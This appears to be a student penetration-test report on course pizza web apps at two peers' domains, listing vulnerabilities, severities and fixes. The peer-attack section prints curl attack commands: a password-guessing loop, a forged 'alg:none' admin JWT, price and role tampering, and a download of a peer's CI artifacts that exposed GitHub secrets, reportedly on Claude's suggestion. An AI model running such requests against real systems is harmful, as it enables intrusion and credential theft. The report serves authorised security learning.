# Penetration Test

Peers: Than Gerlek, DJ Spoul

Date of attacks: 10 April 2026

## Self Attack -- Target: pizza.gerleksgarage.click

### SQL injection in UpdateUser

- **Severity**: 4 - Critical
- **Result**: Any user could execute arbitrary SQL commands, including complete destruction of all data.
- **Classification**: OWASP A05 Injection
- **Description**: The update-user endpoint (`POST /api/user`) did not sanitize database
inputs. Maliciously-crafted name or email strings could execute arbitrary SQL commands.
- **Remediation**: SQL query now uses parameterized inputs only.

### DeleteFranchise unauthenticated

- **Severity**: 4 - Critical
- **Result**: All franchises could be deleted by unauthenticated requests.
- **Classification**: OWASP A01 Broken Access Control
- **Description**: The DeleteFranchise endpoint (`DELETE /api/franchise/:franchiseId`) was completely
unauthenticated--it did not require a token and had no role check. Any request could delete any franchise
for which the ID was known, and a complete list of franchise IDs can be obtained without authentication
from `GET /api/franchise`.
- **Remediation**: The `DELETE /api/franchise/:franchiseId` endpoint now requires authentication as admin.

### Empty passwords accepted

- **Severity**: 3 - High
- **Result**: Full access to arbitrary user accounts obtained. All user accounts at all privilege levels vulnerable.
- **Classification**: OWASP A07 Authentication Failures
- **Description**: The password check in `GET /api/auth` (the login endpoint) required the password field to be truthy
before passing it to bcrypt. However, rather than failing the check, the check was simply never made. This means
requests with a falsy `password` field (empty string, undefined, etc) were simply accepted as valid login requests.
- **Remediation**: Login requests with falsy password fields are now rejected.

### Leaked stack traces

- **Severity**: 1 - Low
- **Result**: Stack trace exposed on server errors.
- **Classification**: OWASP A02 Security Misconfiguration
- **Description**: Error cases attached the stack trace (with filenames, etc.) to error resopnses. With
an open-source application, this was less useful, but still might be a vector for revealing internal state.
- **Remediation**: Stack traces are now gated by an environment variable, set to false in prod.

### User emails confirmed as valid

- **Severity**: 1 - Medium
- **Result**: Could confirm an email belongs to a valid user without authentication.
- **Classification**: OWASP A10 Mishandling of Exceptional Conditions
- **Description**: A login request that failed returned different status codes (401 and 403) if the
password was incorrect versus if the user was not found. This allowed confirmation of valid user emails.
- **Remediation**: Error responses (including status codes) for failed login or register requests are
now always the same.

## Self Attack -- Target: pizza.djsproul.click

### Attempt #1

- **Vulnerability:** SQL injection in update user
- **Severity:** moderate. Could inject, but SQL got flattened and couldn't do anything useful
- **Remediation:** Parameterized database.js updateUser function to further flatten any potential injections

### Attempt #2

- **Vulnerability:** Able to get access to pretty much everything via curl with the default admin
- **Severity:** critical
- **Remediation:** Removed default admin creation from DB intialization

### Attempt #3

- **Vulnerability:** No rate limiting, so passwords can be brute forced
- **Severity:** moderate
- **Remediation:** Added rate limiter middleware

### Attempt #4

- **Vulnerability:** Able to order pizza for $0 through curl request
- **Severity:** critical
- **Remediation:** Check order price against saved pizza price before confirming

### Attempt #5

- **Vulnerability:** Able to see stack trace through intentionally sending requests that error
- **Severity:** ? couldn't figure out how it was useful
- **Remediation:** only print the stack trace in dev

## Peer attack -- Target: pizza.gerleksgarage.click

### . Attempt #1

Uncovered existence of `/lol` endpoint in peer's repo. Created a diner account through curl:

```bash
curl -s -X POST https://pizza-service.gerleksgarage.click/api/auth \
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker@test.com","password":"password123"}'
```

Ordered pizza, attempted to set price to $0.00 (did not work — server enforces real menu price):

```bash
# Use token returned by POST
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGFja2VyIiwiZW1haWwiOiJoYWNrZXJAdGVzdC5jb20iLCJyb2xlcyI6W3sicm9sZSI6ImRpbmVyIn1dLCJpZCI6MTMsImlhdCI6MTc3NTg1NzY5Nn0.4_wP6PdHraRINgrk2P125cboHYFyPdz4zTLP7vtfj1I"

curl -s https://pizza-service.gerleksgarage.click/api/order/menu

curl -s -X POST https://pizza-service.gerleksgarage.click/api/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":1,"storeId":1,"items":[{"menuId":1,"description":"Veggie","price":0.00}]}'
```

Pizza order returned a signed JWT which decoded to reveal the vendor's internal ID and name:

```txt
ID: ng322
Name: Nathaniel Gerlek
```

Attempted to use the net ID and variations as the password for the `/lol` endpoint (did not work):

```bash
for pw in "ng322" "Ng322" "NG322" "nathaniel" "gerlek" "nathanielgerlek" "NathanielGerlek"; do
  echo -n "$pw: "
  curl -s -X POST https://pizza-service.gerleksgarage.click/api/auth/lol \
    -H "Content-Type: application/json" \
    -d "{\"pw\":\"$pw\",\"query\":\"SELECT 1\"}"
  echo ""
done
```

**Vulnerability:** Hidden debug endpoint `POST /api/auth/lol` exists in production. Accepts a password and executes
arbitrary SQL. Unexploitable without the password.

**Severity:** Critical to brute force

### . Attempt #2

Attempted to create a store under a non-existent franchise (ID 999) to trigger an error:

```bash
curl -s -X POST https://pizza-service.gerleksgarage.click/api/franchise/999/store \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"test"}'
```

Full stack trace was returned in the response:

```json
{
    "message": "unable to create a store",
    "stack": "Error: unable to create a store\n    at /usr/src/app/routes/franchiseRouter.js:152:15\n    at process.processTicksAndRejections (node:internal/process/task_queues:103:5)"
}
```

Further probed by sending malformed franchise IDs to trigger DB-level errors:

```bash
curl -s -X DELETE https://pizza-service.gerleksgarage.click/api/franchise/null \
  -H "Authorization: Bearer $TOKEN"

curl -s -X POST https://pizza-service.gerleksgarage.click/api/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"franchiseId":"null","storeId":"null","items":[{"menuId":"null","description":"test","price":0.05}]}'
```

DB-level stack traces bubbled up, exposing internal file paths, line numbers, and architecture details:

```json
{
    "message": "unknown menu item",
    "stack": "Error: unknown menu item\n    at DB.addDinerOrder (/usr/src/app/database/database.js:271:17)\n    at process.processTicksAndRejections (node:internal/process/task_queues:103:5)\n    at async /usr/src/app/routes/orderRouter.js:127:21"
}
```

**Vulnerability:** Error messages expose full stack traces. Not useful since I have the repo, but would be useful
to someone who doesn't.

**Severity:** Moderate

### . Attempt #3

Attempted JWT algorithm confusion attack (`alg:none`). Crafted a forged token with no signature claiming admin role:

```bash
curl -s -X DELETE https://pizza-service.gerleksgarage.click/api/franchise/1 \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwibmFtZSI6ImFkbWluIiwiZW1haWwiOiJhQGp3dC5jb20iLCJyb2xlcyI6W3sicm9sZSI6ImFkbWluIn1dLCJpYXQiOjE3NzU4NTc2OTZ9."
```

Server correctly returned `401 unauthorized`. The `jwt.verify` call explicitly pins the algorithm to `HS256`,
rejecting any token with a different algorithm including `none`.

**Vulnerability:** None — properly mitigated.

**Severity:** N/A

### . Attempt #4

Attempted to register new user with admin role

```bash
curl -s -X POST https://pizza-service.gerleksgarage.click/api/auth \ 
  -H "Content-Type: application/json" \
  -d '{"name":"hacker","email":"hacker4@test.com","password":"password123","roles":[{"role":"admin"}]}'
{"user":{"name":"hacker","email":"hacker4@test.com","roles":[{"role":"diner"}],"id":14},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiaGFja2VyIiwiZW1haWwiOiJoYWNrZXI0QHRlc3QuY29tIiwicm9sZXMiOlt7InJvbGUiOiJkaW5lciJ9XSwiaWQiOjE0LCJpYXQiOjE3NzU4NTk5MjB9.CTY7O0VUYHMvCA5UdrFsLReZCgdaJ9p2Jq0mOBPQ7kg"}%
```

Decoding the JWT token that the server returned revealed that the role of the new user was still diner, as expected
but as I hoped not.

**Vulnerability:** None - properly mitigated

**Severity:** N/A

### . Attempt #5

Asked Claude and enabled extended thought for this one -- it suggested that I might be able to grab Than's repo's
artifacts with a public repo token.

```bash
curl -s https://api.github.com/repos/ThanGerlek/jwt-pizza-service/actions/artifacts
```

They were there, so I downloaded them with a public repo token:

```bash
curl -L -o package.zip \                     
  "https://api.github.com/repos/ThanGerlek/jwt-pizza-service/actions/artifacts/6364609687/zip" \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer [TOKEN]"

unzip package.zip -d package/
cat package/config.js
```

I won't paste the response because it contained all of his GitHub secrets. Seems like something GitHub really should
fix -- I'm not sure why that's even allowed at all.

**Vulnerability:** CI/CD secret exposure through public curl request

**Severity:** Critical

## Peer Attack -- Target: pizza.djsproul.click

### DeleteFranchise is unauthenticated

- **Severity**: 4 - Critical
- **Result**: All franchises deleted, rendering the application nearly unusable. All revenue streams blocked.
- **Classification**: OWASP A01 Broken Access Control
- **Description**: The DeleteFranchise endpoint (`DELETE /api/franchise/:franchiseId`) is completely
unauthenticated--it does not require a token and has no role check. Any request can delete any franchise
for which the ID is known, and a complete list of franchise IDs can be obtained without authentication
from `GET /api/franchise`.
- **Remediation**: Require authentication and admin-only access check on the `DELETE /api/franchise/:franchiseId`
endpoint.

**Evidence**:

![no_franchises.jpg](no_franchises.jpg)

### Empty passwords are accepted

- **Severity**: 3 - High
- **Result**: Full access to arbitrary user accounts obtained. All user accounts at all privilege levels vulnerable.
- **Classification**: OWASP A07 Authentication Failures
- **Description**: The password check in `GET /api/auth` (the login endpoint) requires the password field to be truthy
before passing it to bcrypt. However, rather than failing the check, the check is simply never made. This means
requests with a falsy `password` field (empty string, undefined, etc) are simply accepted as valid login requests.
- **Remediation**: Reject login requests with falsy password fields.

**Evidence**:

![logged_in_as_d.jpg](logged_in_as_d.jpg)

### Stolen authentication tokens never expire

- **Severity**: 2 - Medium
- **Result** _(theoretical)_: Stolen authentication tokens allow nearly permanent access.
- **Classification**: OWASP A07 Authentication Failures
- **Description**: There is no mechanism for authentication tokens to expire, meaning a stolen token gives an attacker
access until either that specific token is logged out or the user is deleted. Additionally, because there is no
mechanism for logging out all tokens for a given user, if the user loses access to the token without explicitly
logging out (leaving the attacker as the sole party with that token), the only strategy for removing the attacker's
access is to delete the account. (Demotion is not a solution because of vulnerability 2b.)
- **Remediation**: Add an expiry date to authentication tokens; add a mechanism to forcibly invalidate all tokens
linked to a given account.
- **Evidence**: Source code analysis

### Tokens have the user's role baked in

- **Severity**: 2 - Medium
- **Result** _(theoretical)_: Demoted users can retain admin access by retaining tokens.
- **Classification**: OWASP A07 Authentication Failures
- **Description**: Admin access is determined entirely by the contents of the provided token. Thus, admin tokens
retain those roles even if the user's admin status has been removed.
- **Remediation**: Use tokens to establish identity only. Access rights should be confirmed dynamically.
- **Evidence**: Source code analysis

### Email addresses not required to be unique

- **Severity**: 2 - Medium
- **Result**: Several arbitrary users' accounts were locked, semi-permanently preventing the user from accessing them.
- **Classification**: OWASP A06 Insecure Design
- **Description**: The register () and update-user () endpoints have no check against preexisting email addresses, and
the `user` table in the database does not enforce email uniqueness. Thus, an attacker can create an account with the
same email as an existing user by sending a register request with that email or an update-user request to give their
account that email. When anyone then attempts to log in with that email, the first result returned from the database
with that email is used for comparison. That order is dependent on the SQL implementation. If the implementation
chooses the hacker's account, the user is effectively locked out of their account--potentially permanently, if the
decision is deterministic.
- **Remediation**: Add the UNIQUE constraint to the `users` table's email, and add checks to register and update-user
to deny attempts that would create a user with the same email as an existing user.

**Evidence**:

![invalid_update.jpg](invalid_update.jpg)

### JWT with spoofed item description

- **Severity**: 1 - Low
- **Result**: Valid JWTs obtained with arbitrary attacker-controlled item descriptions.
- **Classification**: OWASP A08 Software or Data Integrity Failures
- **Description**: The send-order endpoint () checks the menuId for each item and loads the price from the database,
but it does not load the item description, instead simply trusting the description sent by the client. This enables
an attacker to create orders with arbitrary item descriptions simply by manipulating the request, resulting in valid
JWTs containing those descriptions.
- **Remediation**: Read all item data from the database, not just price.

### Other potential vulnerabilities

- e1. `/api/docs` exposes factory URL and DB host
- e2. CORS reflects `Origin` with `Access-Control-Allow-Credentials: true`
- e3. `jwt.verify` does not pin `algorithms`
- e4. Session lookup uses JWT signature segment only; edge cases with malformed tokens
- e5. Dependency advisories (e.g. `path-to-regexp` / Express, `jws` via `jsonwebtoken`)
- e6. Rate limiting only on auth routes; trust proxy not configured
- e7. Factory `reportUrl` / JWT echoed from order flow without strict validation

## Combined learnings

We have a few takeaways from this pen testing experience. For starters, we learned to be especially careful about
password-related checks. Exhaustive testing would have saved DJ from the exploit where Than was able to log in without
a password. In relation to that one, we learned not to rely on the front end! DJ’s password was protected on the front
end but the back end was vulnerable. Also in this vein, DJ was vulnerable because he didn’t require emails to be unique.
In practice, this would have been solved if he modeled invariants as deeply as possible (don’t just expect uniqueness
in the front end or back end, do it all the way down in the DB). Next (and this one was surprising), don’t inject secrets
with a config file! Apparently anyone with a GitHub access token and your repo name can pull all of your secrets if you
inject them with a config file and your repo is public. The safer thing to do is use a .env. In that vein, we very much
learned to question the assumptions that we are making (are GitHub secrets actually secret, is my code supposed to work
this way or should it work a different way, should I refactor the test or the code, etc). That is a good way to increase
security in all aspects of the devops process. In relation to that, it’s important to think about the assumptions others
are making, especially agents. Both Than and DJ ran into instances this semester where they were attempting to fix a
failing test and their chosen agent’s response was to reintroduce a bug that they had just removed. Agents may not have
the same priorities as developers. Lastly, people are fallible and predictable. While Than and DJ were not able to
penetrate each other’s sites using password guesses, Than was actually able to learn a lot about DJ just from Googling
him. Had DJ’s default passwords been anything too personal, they probably would have been cracked. All of that being
said, we think that the takeaway really just boils down to one very important thing: in the real world, hire a
cybersecurity professional.
